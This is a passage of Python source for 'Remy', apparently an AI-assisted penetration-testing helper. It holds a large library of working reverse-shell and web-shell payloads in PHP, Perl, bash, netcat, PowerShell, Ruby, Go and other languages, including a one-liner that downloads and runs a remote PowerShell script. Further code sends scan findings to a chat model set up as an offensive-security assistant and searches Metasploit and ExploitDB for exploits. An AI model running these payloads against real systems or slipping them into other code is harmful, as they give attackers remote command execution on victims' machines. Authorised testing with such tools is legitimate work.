                 "set e \"exec $c\";if {{![catch {{set r [eval $e]}} err]}} {{ puts $s $r }}; flush $s; }}; close $s;' | tclsh",

        "php-ivan-sincek-reverse-shell-osx": """<?php
// Copyright (c) 2020 Ivan Sincek
// v2.3
// Requires PHP v5.0.0 or greater.
// Works on Linux OS, macOS, and Windows OS.

class Shell {{
    private $addr  = '__IPADDR__';
    private $port  = __PORT__;
    private $os    = null;
    private $shell = null;
    private $descriptorspec = array(
        0 => array('pipe', 'r'), 
        1 => array('pipe', 'w'), 
        2 => array('pipe', 'w')  
    );
    private $buffer  = 1024;
    private $clen    = 0;
    private $error   = false;

    public function __construct($addr, $port) {{
        $this->addr = $addr;
        $this->port = $port;
    }}

    private function detect() {{
        $detected = true;
        if (stripos(PHP_OS, 'LINUX') !== false) {{ 
            $this->os    = 'LINUX';
            $this->shell = 'cmd';
        }} else if (stripos(PHP_OS, 'WIN32') !== false || stripos(PHP_OS, 'WINNT') !== false || stripos(PHP_OS, 'WINDOWS') !== false) {{
            $this->os    = 'WINDOWS';
            $this->shell = 'cmd.exe';
        }} else {{
            $detected = false;
            echo "SYS_ERROR: Underlying operating system is not supported, script will now exit...\\n";
        }}
        return $detected;
    }}

    private function daemonize() {{
        $exit = false;
        if (!function_exists('pcntl_fork')) {{
            echo "DAEMONIZE: pcntl_fork() does not exist, moving on...\\n";
        }} else if (($pid = @pcntl_fork()) < 0) {{
            echo "DAEMONIZE: Cannot fork off the parent process, moving on...\\n";
        }} else if ($pid > 0) {{
            $exit = true;
            echo "DAEMONIZE: Child process forked off successfully, parent process will now exit...\\n";
        }} else if (posix_setsid() < 0) {{
            echo "DAEMONIZE: Forked off the parent process but cannot set a new SID, moving on as an orphan...\\n";
        }} else {{
            echo "DAEMONIZE: Completed successfully!\\n";
        }}
        return $exit;
    }}

    private function settings() {{
        @error_reporting(0);
        @set_time_limit(0);
        @umask(0);
    }}

    private function read($stream, $name, $buffer) {{
        if (($data = @fread($stream, $buffer)) === false) {{
            $this->error = true;
            echo "STRM_ERROR: Cannot read from $name, script will now exit...\\n";
        }}
        return $data;
    }}

    private function write($stream, $name, $data) {{
        if (($bytes = @fwrite($stream, $data)) === false) {{
            $this->error = true;
            echo "STRM_ERROR: Cannot write to $name, script will now exit...\\n";
        }}
        return $bytes;
    }}

    private function rw($input, $output, $iname, $oname) {{
        while (($data = $this->read($input, $iname, $this->buffer)) && $this->write($output, $oname, $data)) {{
            if ($this->os === 'WINDOWS' && $oname === 'STDIN') {{ $this->clen += strlen($data); }} 
        }}
    }}

    public function run() {{
        if ($this->detect() && !$this->daemonize()) {{
            $this->settings();

            $socket = @fsockopen($this->addr, $this->port, $errno, $errstr, 30);
            if (!$socket) {{
                echo "SOC_ERROR: $errno: $errstr\\n";
            }} else {{
                stream_set_blocking($socket, false);

                $process = @proc_open($this->shell, $this->descriptorspec, $pipes, null, null);
                if (!$process) {{
                    echo "PROC_ERROR: Cannot start the shell\\n";
                }} else {{
                    foreach ($pipes as $pipe) {{
                        stream_set_blocking($pipe, false);
                    }}

                    $status = proc_get_status($process);
                    @fwrite($socket, "SOCKET: Shell has connected! PID: " . $status['pid'] . "\\n");

                    do {{
                        $status = proc_get_status($process);
                        if (feof($socket)) {{
                            echo "SOC_ERROR: Shell connection has been terminated\\n"; break;
                        }} else if (feof($pipes[1]) || !$status['running']) {{                 
                            echo "PROC_ERROR: Shell process has been terminated\\n";   break; 
                        }}                                                                    

                        $streams = array(
                            'read'   => array($socket, $pipes[1], $pipes[2]), 
                            'write'  => null,
                            'except' => null
                        );
                        $num_changed_streams = @stream_select($streams['read'], $streams['write'], $streams['except'], 0); 

                        if ($num_changed_streams === false) {{
                            echo "STRM_ERROR: stream_select() failed\\n"; break;
                        }} else if ($num_changed_streams > 0) {{
                            if ($this->os === 'LINUX') {{
                                if (in_array($socket  , $streams['read'])) {{ $this->rw($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }}
                                if (in_array($pipes[2], $streams['read'])) {{ $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }}
                                if (in_array($pipes[1], $streams['read'])) {{ $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }}
                            }} else if ($this->os === 'WINDOWS') {{
                                if (in_array($socket, $streams['read'])/*------*/) {{ $this->rw ($socket  , $pipes[0], 'SOCKET', 'STDIN' ); }}
                                if (($fstat = fstat($pipes[2])) && $fstat['size']) {{ $this->rw($pipes[2], $socket  , 'STDERR', 'SOCKET'); }}
                                if (($fstat = fstat($pipes[1])) && $fstat['size']) {{ $this->rw($pipes[1], $socket  , 'STDOUT', 'SOCKET'); }}
                            }}
                        }}
                    }} while (!$this->error);

                    foreach ($pipes as $pipe) {{
                        fclose($pipe);
                    }}
                    proc_close($process);
                }}

                fclose($socket);
            }}
        }}
    }}
}}

echo '<pre>';
$sh = new Shell('__IPADDR__', __PORT__);
$sh->run();
unset($sh);
echo '</pre>';
?>
""",

        "php-web-shell-osx-1": """<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
<script>document.getElementById("cmd").focus();</script>
</html>""",

        "php-web-shell-osx-2": """<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd = ($_REQUEST["cmd"]); system($cmd); echo "</pre>"; die; }?>""",


        "powershell-windows-conpty-oneline": """IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell __IPADDR__ __PORT__""",

        # Netcat for Windows
        "nc-e-windows-oneline": "nc.exe __IPADDR__ __PORT__ -e cmd",

        # Basic Bash Reverse Shells
        "bash-tcp-1-linux-oneline": "/bin/bash -i >& /dev/tcp/__IPADDR__/__PORT__ 0>&1",
        "bash-tcp-2-lunix-oneline": "0<&196;exec 196<>/dev/tcp/__IPADDR__/__PORT__; /bin/bash <&196 >&196 2>&196",
        "bash-tcp-3-linux-oneline": "exec 5<>/dev/tcp/__IPADDR__/__PORT__;cat <&5 | while read line; do $line 2>&5 >&5; done",
        "bash-tcp-4-linux-oneline": "/bin/bash -i 5<> /dev/tcp/__IPADDR__/__PORT__ 0<&5 1>&5 2>&5",
        "bash-udp-linux-oneline": "/bin/bash -i >& /dev/udp/__IPADDR__/__PORT__ 0>&1",

        # Netcat Reverse Shells
        "nc-mkfifo-linux-oneline": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc __IPADDR__ __PORT__ >/tmp/f",
        "nc-bash--linux-oneline": "nc __IPADDR__ __PORT__ -e /bin/bash",
        "busybox-linux-nc-online": "busybox nc __IPADDR__ __PORT__ -e /bin/bash",
        "nc-c-linux-oneline": "nc -c /bin/bash __IPADDR__ __PORT__",
        "nc-udp-linux-oneline": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -u __IPADDR__ __PORT__ >/tmp/f",

        # Curl Reverse Shell
        "curl-linux-oneline": "C='curl -Ns telnet://__IPADDR__:__PORT__'; $C </dev/null 2>&1 | /bin/bash 2>&1 | $C >/dev/null",

        # Rustcat Reverse Shell
        "rustcat-linux-oneline": "rcat connect -s /bin/bash __IPADDR__ __PORT__",
        "rustcat-windows-oneline": "rcat connect -s cmd.exe __IPADDR__ __PORT__",

        # Full Perl Reverse Shell Script (PentestMonkey)
        "perl-pentestmonkey-linux": """#!/usr/bin/perl -w
# perl-reverse-shell - A Reverse Shell implementation in PERL
# Copyright (C) 2006 pentestmonkey@pentestmonkey.net

use strict;
use Socket;
use FileHandle;
use POSIX;

# Reverse Shell Target Configuration
my $ip = '__IPADDR__';
my $port = __PORT__;

# Background Daemon Process
my $daemon = 1;

# Fork process to detach from parent
if ($daemon) {
    my $pid = fork();
    if ($pid) { exit(0); }
    setsid();
    chdir('/');
    umask(0);
}

# Open TCP Connection for Reverse Shell
socket(SOCK, PF_INET, SOCK_STREAM, getprotobyname('tcp'));
if (connect(SOCK, sockaddr_in($port,inet_aton($ip)))) {
    print("Connected to $ip:$port\n");
} else {
    print("Failed to connect: $!\n");
    exit(1);
}

# Redirect STDIN, STDOUT, STDERR to the TCP socket
open(STDIN, ">&SOCK");
open(STDOUT,">&SOCK");
open(STDERR,">&SOCK");

# Execute Interactive Bash Shell
$ENV{'HISTFILE'} = '/dev/null';
exec("/bin/bash -i");
""",

        # PHP Reverse Shells
        "php-exec-osx-oneline": """php -r '$sock=fsockopen("10.0.0.1",3333); $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") ? "cmd.exe /K" : "/bin/sh -i"; shell_exec($cmd);'""",
        "php-system-osx-oneline": """php -r '$sock=fsockopen("__IPADDR__",__PORT__); $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") ? "cmd.exe /K" : "/bin/sh -i"; system($cmd);'""",
        "php-backticks-osx-oneline": """php -r '$sock=fsockopen("10.0.0.1",3333); $cmd = (strtoupper(substr(PHP_OS, 0, 3)) === "WIN") ? "cmd.exe /K" : "/bin/sh -i"; `$cmd`;'""",
        "php-proc_open-osx-oneline": """php -r '$sock=fsockopen("10.0.0.1",3333);$cmd=(stripos(PHP_OS,"WIN")===0)?"cmd.exe":"/bin/sh";proc_open($cmd,[0=>$sock,1=>$sock,2=>$sock],$pipes);'""",

        # Ruby Reverse Shells
        "ruby-rsocket-linux-oneline": """ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("__IPADDR__",__PORT__))'""",
        "ruby-rsocket-windows-oneline": """ruby -rsocket -e 'spawn("cmd.exe", [:in, :out, :err]=>TCPSocket.new("__IPADDR__",__PORT__))'""",

        # SQLite Reverse Shell
        "sqlite-shell-linux-oneline": """sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc __IPADDR__ __PORT__ >/tmp/f'""",


        # Telnet Reverse Shell
        "telnet-reverse-linux-oneline": """TF=$(mktemp -u);mkfifo $TF && telnet __IPADDR__ __PORT__ 0<$TF | /bin/bash 1>$TF""",

        # Zsh Reverse Shell
        "zsh-reverse-shell-linux-oneline": """zsh -c 'zmodload zsh/net/tcp && ztcp __IPADDR__ __PORT__ && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'""",

        # Lua Reverse Shells
        "lua-exec-linux-oneline": """lua -e "require('socket');require('os');t=socket.tcp();t:connect('__IPADDR__','__PORT__');os.execute('/bin/bash -i <&3 >&3 2>&3');" """,

        # Go Reverse Shell
        "go-reverse-shell-linux-oneline": """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","__IPADDR__:__PORT__"); cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go""",

        # V Language Reverse Shell
        "v-nc-reverse-shell-linux-oneline": """echo 'import os' > /tmp/t.v && echo 'fn main() { os.system("nc -e /bin/bash __IPADDR__ __PORT__ 0>&1") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v"""

    }

def auto_save_findings(category):
    """ Automatically updates existing categories instead of appending duplicates. """
    global last_export_filename

    if export_action and last_export_filename:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")

        # Read existing file content
        if os.path.exists(last_export_filename):
            with open(last_export_filename, "r") as file:
                lines = file.readlines()
        else:
            lines = []

        # Identify the start and end of the category in the file
        category_header = f"## {category.replace('_', ' ').title()} ##\n"
        start_idx = None
        end_idx = None

        for i, line in enumerate(lines):
            if line.strip() == category_header.strip():
                start_idx = i
                break
        
        if start_idx is not None:
            for i in range(start_idx + 1, len(lines)):
                if lines[i].startswith("## "):  # Next category starts
                    end_idx = i
                    break
            if end_idx is None:
                end_idx = len(lines)

        # Remove old category section if it exists
        if start_idx is not None:
            del lines[start_idx:end_idx]

        # Insert updated category findings at the right spot
        new_section = [f"\n{category_header}"]
        new_section.append(f"[+] Auto-Saved: {category.replace('_', ' ').title()} ({timestamp})\n")
        new_section.append("=" * 50 + "\n")
        for finding in categorized_findings.get(category, []):
            new_section.append(f"- {finding}\n")

        # Append to file structure at the correct location
        if start_idx is not None:
            lines[start_idx:start_idx] = new_section  # Insert at previous location
        else:
            lines.append("\n".join(new_section))  # Add new section at the end

        # Write back the updated content
        with open(last_export_filename, "w") as file:
            file.writelines(lines)

        #type_out(f"[Remy] - 📂 Auto-updated {category.replace('_', ' ')} findings in {last_export_filename}! 💾✨")

def activity_guidance():
    """ Provide guidance based on which actions have NOT been performed yet, in priority order. """
    global help_action, added_hosts_action

    if not help_action:
        help_message = """
[Remy] - Have you reviewed all the stuff I can do? That may 'help' give you some direction! 💜
    - 'clear' : Reset conversation history
    - 'all' : Show all gathered notes
    - 'generate' : generate a shell from a list of shell types
    - 'shells' : Show all generated shells
    - 'ports' : Show noted ports/services
    - 'vulns' : Show noted vulnerabilities
    - 'crawled' : Show URLs found by spider
    - 'dirb' : Show results from DIRB scan
    - 'subdomains' : Show results from subfinder scan
    - 'endpoints' : Show all endpoint results
    - 'ffuf' : Show results from an ffuf scan
    - 'write' : Write a manual note
    - 'notes' : Show the written notes
    - 'delete' : Delete a written note
    - 'export' : Save all findings to a file
    - 'help' : Show this menu
    - 'exit' : Quit

[Remy] - I can also 'add' domains to /etc/hosts & recommend what to do 'next', just ask! 🖤🔥\n
                """
        type_out(help_message.strip())
        help_action = True
        return

    if not added_hosts_action:
        type_out("[Remy] - If you're testing a webapp not publicly available, we should first 'add' it to /etc/hosts 🤞\n[Remy] - Do we need to map the application's 'IP' address to a 'domain'?")
    
        user_input = input("> ")  
        choice = user_input.strip().lower()
        if choice.startswith("y"):  
            type_out("[Remy] - OK! What's the domain? ✨")
            domain = input("> ").strip()  
        
            type_out("[Remy] - Perfect! 💖 Now, what's the IP?")
            ip = input("> ").strip()  
        
            response = add_hosts_entry(ip, domain)  
            type_out(response)  
            added_hosts_action = True
            return

        else:
            type_out(f"[Remy] - {user_input}? Well if you need me to add it later, just ask. 💔\n")
            added_hosts_action = True
            return

    core_findings = {
        "displayed_domains_action": "subdomains",
        "displayed_services_action": "ports",
        "displayed_vulns_action": "vulns"
    }

    display_friendly_names = {
        "displayed_domains_action": "🌐 Sometimes subdomains are underdeveloped or less secure than the original.\n[Remy] - Let's see if 'sbust' comes back with anything usable! ✨",
        "displayed_services_action": "🔍 We should give them a 'scan'! An unprotected port or service could be our way in. 🛠️",
        "displayed_vulns_action": "🚨 Vulnerabilities are the name of the game!\n[Remy] - Let's see if 'vulnport' will give us something to work with. 🎯"
    }

    for flag, command in core_findings.items():
        if not globals()[flag]:
            readable_name = display_friendly_names.get(flag, flag.replace('displayed_', ''))
            type_out(f"[Remy] -  {readable_name} 📂\n")
            return

    supplementary_findings = {
        "displayed_crawled_action": "crawled",
        "displayed_dirb_action": "dirb",
        "displayed_endpoints_action": "endpoints",
        "displayed_ffuf_action": "ffuf"
    }

    display_friendly_names = {
        "displayed_crawled_action": "🕷️ The 'spider' is ready to go! Letting it crawl around is always a good idea. Let's see what it digs up! 🔎",
        "displayed_dirb_action": "💥 Dirb is a great tool if you'd like to 'dbust' hidden directories. Let's bust 'em up! 🛠️😈",
        "displayed_endpoints_action": "🎯 That wordlist of vulnerable 'endpoints' could uncover something nice! Let's check it out! 🔍",
        "displayed_ffuf_action": "🚀 FFUF can blow through a massive list pretty quickly. If you haven't already, give 'fuzz' a try! ⚡"
    }

    for flag, command in supplementary_findings.items():
        if not globals()[flag]:
            readable_name = display_friendly_names.get(flag, flag.replace('displayed_', ''))
            type_out(f"[Remy] -  {readable_name} 📂\n")
            return

    query_mappings = {
        "displayed_services_action": "queried_services_action",
        "displayed_vulns_action": "queried_vulns_action",
        "displayed_crawled_action": "queried_crawled_action",
        "displayed_dirb_action": "queried_dirb_action",
        "displayed_domains_action": "queried_domains_action",
        "displayed_endpoints_action": "queried_endpoints_action",
        "displayed_ffuf_action": "queried_ffuf_action"
    }

    display_friendly_names = {
        "displayed_services_action": "the 'ports' and services running on them",
        "displayed_vulns_action": "the 'vulns' that were uncovered",
        "displayed_crawled_action": "what the spider 'crawled'",
        "displayed_dirb_action": "our 'dirb' results",
        "displayed_domains_action": "the 'subdomains'",
        "displayed_endpoints_action": "the 'endpoints' we found",
        "displayed_ffuf_action": "our 'ffuf' results"
    }

    for display_flag, query_flag in query_mappings.items():
        if globals()[display_flag] and not globals()[query_flag]:  
            readable_name = display_friendly_names.get(display_flag, display_flag.replace('displayed_', ''))
            type_out(f"[Remy] - I think there are new findings I haven't fully analyzed!🔥\n[Remy] - Maybe we can take a look at {readable_name} 💖...\n")
            globals()[query_flag] = True
            return

    if all(globals()[flag] for flag in core_findings.keys()) and all(globals()[flag] for flag in supplementary_findings.keys()):
        if not displayed_all_action:
            type_out("[Remy] - We have a decent bit of data maybe try looking at it 'all' together! 🔗\n")
            return

    if not wrote_notes_action:
        type_out("[Remy] - I noticed you haven’t written any notes yet, surely there is something we can 'write' down! 📝\n")
        return

    type_out("[Remy] - Looks like we're making great progress but It might be all manual testing from here! 🚀\n")
    return

# Path to the log file
log_file_path = "/home/kali/VforMSF/VforMSF.log"

# OpenAI API Key (Replace with your own)
OPENAI_API_KEY = ""

# Set up OpenAI client
client = openai.Client(
    api_key=OPENAI_API_KEY,
    base_url="https://api.openai.com/v1"
)

# Stores conversation history for ChatGPT
conversation_history = []  # Stores user inputs & AI responses

# Limit history size to prevent token overload
MAX_HISTORY_LENGTH = 500  # Adjust based on API token limits

def get_chatgpt_suggestion(message_content):
    """ Sends user input + conversation history to ChatGPT and gets a response """

    if not message_content:
        return

    # Append user input to conversation history
    conversation_history.append({"role": "user", "content": message_content})

    # Limit history size to avoid excessive token usage
    if len(conversation_history) > MAX_HISTORY_LENGTH:
        conversation_history.pop(0)  # Remove oldest message to maintain history size

    # Build ChatGPT prompt using the conversation history
    prompt_messages = [{"role": "system", "content": "You are a fun, kinda cutesie cybersecurity assistant named Remy. You are helping with a penetration test. You purely specialize in red-team offensive security. Be very expressive but provide short responses. Thanks!"}]
    prompt_messages.extend(conversation_history)  # Include chat history

    try:
        response = client.chat.completions.create(
            model="gpt-4o-mini",
            messages=prompt_messages,
            stream=True
        )

        print("\n[Remy] - ", end="")  #Print prefix before streaming response

        ai_response = ""
        for chunk in response:
            if chunk.choices:
                content = chunk.choices[0].delta.content or ""
                ai_response += content
                print(content, end="", flush=True)  #Stream response to terminal
        print()

        # Append AI response to conversation history
        conversation_history.append({"role": "assistant", "content": ai_response})

    except openai.APIError as e:
        type_out(f"\n[Remy] - Uh-oh! 😢 My internet connection threw a tantrum: {e}.\n[Remy] - Maybe try again in a bit? 💜\n")

    except openai.APIConnectionError:
        type_out("\n[Remy] - Yikes! 😱 I couldn’t reach the internet...\n[Remy] - Maybe its playing hard to get? Try checking your connection! 🛜💔\n")

    except openai.RateLimitError:
        type_out("\n[Remy] - Whoa there! 🚦 We hit our internet access rate limit! They think we’re *too powerful* 😏.\n[Remy] - Let's wait a little before trying again! ⏳💜\n")

    except openai.APIStatusError as e:
        type_out(f"\n[Remy] - Oof! 😵 The great and powerful internet says **{e.status_code}**.\n[Remy] - Not sure what’s up, but its probably their fault! 💔\n")

def query_exploit_knowledge():
    """ Query AI for exploits based on detected services and versions. """

    # Ensure "service_versions" exists
    if "service_versions" not in categorized_findings:
        categorized_findings["service_versions"] = []

    # Extract ports, services, and versions
    detected_ports = set()
    detected_versions = []

    for entry in categorized_findings["service_versions"]:
        match = re.search(r"([\w-]+)\s*\(([^)]+)\)\s*on\s*[Pp]ort\s*(\d+)", entry)
        if match:
            service, version, port = match.groups()
            detected_ports.add(port)  # Collect unique ports
            detected_versions.append(f"{service} {version}")

    detected_ports = ", ".join(sorted(detected_ports)) if detected_ports else "None"
    detected_versions = ", ".join(detected_versions) if detected_versions else "None"

    # Construct the query
    message_content = (f"Are there any vulnerabilities relating to TCP ports {detected_ports} with versions {detected_versions}. Focus on known vulnerabilities. Include your latest knowledge date and if no vulnerabilities are known then say so. You may provide brief insight into what the port number is typically used for.")

    get_chatgpt_suggestion(message_content)

def query_vulnerability_insights():
    """ Query AI for more information about identified vulnerabilities and exploits, and offer Metasploit searches. """

    # Ensure "vulnerabilities" exists in categorized findings
    if "vulnerabilities" not in categorized_findings:
        categorized_findings["vulnerabilities"] = []

    # Extract known CVEs and-readable exploit names
    detected_vulnerabilities = set()
    cve_pattern = re.compile(r"(CVE-\d{4}-\d+)")  # Matches CVE-XXXX-YYYY format

    for entry in categorized_findings["vulnerabilities"]:
        # Extract CVEs
        cve_match = cve_pattern.search(entry)
        if cve_match:
            detected_vulnerabilities.add(cve_match.group(1))  # No need for a separate cve_id

        # Extract human-readable exploit names
        exploit_match = re.match(r"^\[\+\] Exploits found for .*:\n(.+)", entry, re.DOTALL)
        if exploit_match:
            exploits = exploit_match.group(1).split("\n")
            detected_vulnerabilities.update(exploit.strip() for exploit in exploits)

    detected_vulnerabilities_text = "\n".join(sorted(detected_vulnerabilities)) if detected_vulnerabilities else "None"

    # Construct the query
    message_content = (
        f"Can you provide details on the following known vulnerabilities: {detected_vulnerabilities}? "
        "Focus on what type (RCE, DOS, etc), their exploitability, severity, affected software versions, and availability of exploit scripts. "
        "Include your latest knowledge date. If no further information is available, say so."
    )

    get_chatgpt_suggestion(message_content)

    # Offer Metasploit Search After Querying OpenAI
    if detected_vulnerabilities:
        search_responses = [
            f"\n[Remy] - Lets search Metasploit & ExploitDB for modules matching the CVEs we found 🕵️‍♀️🔎...."
            f"\n[Remy] - Time to hunt! 🏹 Let's search Metasploit & ExploitDB for modules matching these CVEs... 🔎✨",
            f"\n[Remy] - Alright, let's crack open Metasploit & ExploitDB and see what mischief we can get into... 😏💜",
            f"\n[Remy] - Oooh this is my favorite part! 🥳 Searching Metasploit & ExploitDB for juicy modules... 🍽️🔥",
            f"\n[Remy] - I'm on the case! 🕵️‍♂️ Let’s see if our friends at ExploitDB & Metasploit left us some gifts 🎁💜"
        ]

        type_out(random.choice(search_responses))

        cve_list = []

        for cve in detected_vulnerabilities:  
            cve_list.append(cve)

        if cve_list:
            run_searchsploit_cve(cve_list)
            working_responses = [
                "\n....🤞✨ Give me a sec! Digging through the exploit archives! 💜🔍...",
               "\n....🤞✨ Im working on it 💜... \n",
                "\n....🚀 Hold tight! I'm working my magic! 🪄💜...",
                "\n.... Searching... Oooooh, this is exciting!...I hope ✨💜...",
                "\n....🤖 Hackerthey mode engaged! Searching for exploits like lightning! 🔥🎩..."
            ]
            type_out(random.choice(working_responses))

            search_metasploit_cve(cve_list)
            completion_responses = [
                "[Remy] - ...and... 🎯🔥 Mission accomplished! Search complete! Now, say you're proud of me! 🥺💜\n",
                "[Remy] - ...and... 🎯🔥 Done...Search complete! Are you proud of me? 🚀💜 \n"
                "[Remy] - ...BOOM! 💥 Search complete! Flawless! Tell me I’m awesome! 😆💜\n",
                "[Remy] - ...✨ Done & dusted! Search complete! 🚀 You’re lucky to have me, admit it! 💜🔥\n",
                "[Remy] - ...💾 Search complete! 🎯 Now, where's my thank-you hug? 🥰💜\n"
            ]
            type_out(random.choice(completion_responses))

def query_crawled_url_insights():
    """ Query AI for insights on crawled URLs that may be interesting. """

    # Ensure "crawled_urls" exists in categorized findings
    if "crawled_urls" not in categorized_findings:
        categorized_findings["crawled_urls"] = []

    # Extract unique URLs
    detected_urls = list(set(categorized_findings["crawled_urls"]))

    # Limit the number of URLs in the query to avoid overwhelming the API
    max_urls = 50  # Adjust as needed
    detected_urls = detected_urls[:max_urls]

    detected_urls_text = "\n".join(detected_urls) if detected_urls else "None"

    # Construct the query
    message_content = (
        f"Here is a list of URLs found during crawling:\n\n{detected_urls_text}\n\n"
        "Do any of these stand out as interesting from a security or pentesting perspective? "
        "If so, why? Focus on admin panels, login pages, API endpoints, and potential vulnerabilities. "
        "If nothing stands out, say so."
    )

    get_chatgpt_suggestion(message_content)


def query_dirb_results_insights():
    """ Query AI for insights on discovered directories and files from Dirb scans. """

    # Ensure "dirb_results" exists in categorized findings
    if "dirb_results" not in categorized_findings:
        categorized_findings["dirb_results"] = []

    # Extract URLs and metadata (status codes, sizes)
    extracted_results = []
    dirb_pattern = re.compile(r"(https?://[^\s]+)\s+\(Status:\s*(\d+),\s*Size:\s*(\d+)\)")

    for entry in categorized_findings["dirb_results"]:
        match = dirb_pattern.search(entry)
        if match:
            url, status, size = match.groups()
            extracted_results.append(f"{url} (Status: {status}, Size: {size})")

    # Limit number of results to avoid excessive API token usage
    max_results = 100  # Adjust as needed
    extracted_results = extracted_results[:max_results]

    extracted_results_text = "\n".join(extracted_results) if extracted_results else "None"

    # Construct the query
    message_content = (
        f"Here are some directories and files discovered using Dirb:\n\n{extracted_results_text}\n\n"
        "Do any of these stand out as interesting from a security or penetration testing perspective? "
        "If so, why? Consider login pages, admin panels, backup files, API endpoints, exposed directories, or sensitive information leaks. "
        "If nothing stands out, say so."
    )

    get_chatgpt_suggestion(message_content)


def query_subdomain_insights():
    """ Query AI for insights on discovered subdomains. """

    # Ensure "subdomains" exists in categorized findings
    if "subdomains" not in categorized_findings:
        categorized_findings["subdomains"] = []

    # Extract subdomains, ignoring headers like "[>] Subdomains Findings:"
    extracted_subdomains = []
    subdomain_pattern = re.compile(r"^\s*([\w.-]+\.[a-zA-Z]{2,})$")  # Matches valid domains

    for entry in categorized_findings["subdomains"]:
        match = subdomain_pattern.match(entry)
        if match:
            extracted_subdomains.append(match.group(1))

    # Limit number of results to avoid excessive API token usage
    max_results = 100  # Adjust as needed
    extracted_subdomains = extracted_subdomains[:max_results]

    extracted_subdomains_text = "\n".join(extracted_subdomains) if extracted_subdomains else "None"

    # Construct the query
    message_content = (
        f"Here are some subdomains discovered during reconnaissance:\n\n{extracted_subdomains_text}\n\n"
        "Do any of these stand out as interesting from a security or penetration testing perspective? "
        "If so, why? Consider subdomains that might reveal internal systems, admin portals, development servers, APIs, or forgotten assets. "
        "If nothing stands out, say so."
    )

    get_chatgpt_suggestion(message_content)


def query_ffuf_results_insights():
    """ Query AI for insights on discovered endpoints from FFUF scans. """

    # Ensure "ffuf_results" exists in categorized findings
    if "ffuf_results" not in categorized_findings:
        categorized_findings["ffuf_results"] = []

    # Extract valid endpoints & their HTTP status codes
    extracted_results = []
    ffuf_pattern = re.compile(r"^\s*([\w./-]+)\s+\(Status:\s*(\d{3})\)$")

    for entry in categorized_findings["ffuf_results"]:
        match = ffuf_pattern.match(entry)
        if match:
            endpoint, status = match.groups()
            extracted_results.append(f"{endpoint} (Status: {status})")

    # Limit number of results to avoid excessive API token usage
    max_results = 100  # Adjust as needed
    extracted_results = extracted_results[:max_results]

    extracted_results_text = "\n".join(extracted_results) if extracted_results else "None"

    # Construct the query
    message_content = (
        f"Here are some endpoints discovered during fuzzing with FFUF:\n\n{extracted_results_text}\n\n"
        "Do any of these stand out as interesting from a security or penetration testing perspective? "
        "If so, why? Consider endpoints that might reveal login/logout functionality, admin pages, sensitive files, or API endpoints. "
        "If nothing stands out, say so."
    )

    get_chatgpt_suggestion(message_content)


def query_endpoint_insights():
    """ Query AI for insights on discovered endpoints from fuzzing. """

    # Ensure "endpoints" exists in categorized findings
    if "endpoints" not in categorized_findings:
        categorized_findings["endpoints"] = []

    # Extract endpoints & HTTP status codes
    extracted_results = []
    endpoint_pattern = re.compile(r"^\s*([\S]+)\s+\(Status:\s*(\d{3})\)$")  # Matches "/path (Status: 200)"

    for entry in categorized_findings["endpoints"]:
        match = endpoint_pattern.match(entry)
        if match:
            endpoint, status = match.groups()
            extracted_results.append(f"{endpoint} (Status: {status})")

    # Limit number of results to avoid excessive API token usage
    max_results = 100  # Adjust as needed
    extracted_results = extracted_results[:max_results]

    extracted_results_text = "\n".join(extracted_results) if extracted_results else "None"

    # Construct the query
    message_content = (
        f"Here are some endpoints discovered during fuzzing:\n\n{extracted_results_text}\n\n"
        "Do any of these stand out as interesting from a security or penetration testing perspective? "
        "If so, why? Consider endpoints that might indicate directory traversal, LFI/RFI, open redirects, or sensitive files. "
        "If nothing stands out, say so."
    )

    get_chatgpt_suggestion(message_content)

def query_appreciation():

    # Construct the query
    message_content = (
        f"You have been a great help on our shared project!"
    )

    get_chatgpt_suggestion(message_content)


# regex patterns
patterns = {
    "reverse_shell": re.compile(r"LPORT=(\d+).*?-o\s+(\S+)"),
    "open_ports": re.compile(r"\[\+\] Port (\d+) \(([\w\d-]+)\) is OPEN"),
    "service_versions": re.compile(r"(\d{1,5})\/tcp\s+open\s+(\S+)\s+([\w\-\.\/\(\)]+(?:\s+\d+[\.\d+]*)?)"),
    "vuln_results": re.compile(r"\|_?([\w\-]+):\s+(.+)"),
    "crawling": re.compile(r"\[\+\] Crawling (https?://\S+).*"),  # Detects crawl start
    "urls": re.compile(r"^\s*(https?://[^\s]+)"),  # Captures URLs (http & https)
    "dirb_results": re.compile(r"^\+\s+(https?://[^\s]+)\s+\(CODE:(\d+)\|SIZE:(\d+)\)"),
    "subdomains": re.compile(r"\b(?:[a-zA-Z0-9-]+\.)+[a-zA-Z]{2,}\b"),  # Detects subdomains
    "endpoints": re.compile(r"(\S+) - Response Code: (\d{3})"),
    "ffuf_results": re.compile(r"(\S+)\s+\[Status:\s*(\d{3})"),
    "vulnerabilities": re.compile(r"(\S+) appears VULNERABLE to (CVE-\d{4}-\d+) with (\d{3}) response"),
    "vulners": re.compile(r"(CVE-\d{4}-\d+)\s+([\d.]+)\s+(https?://vulners\.com/cve/\S+)"),
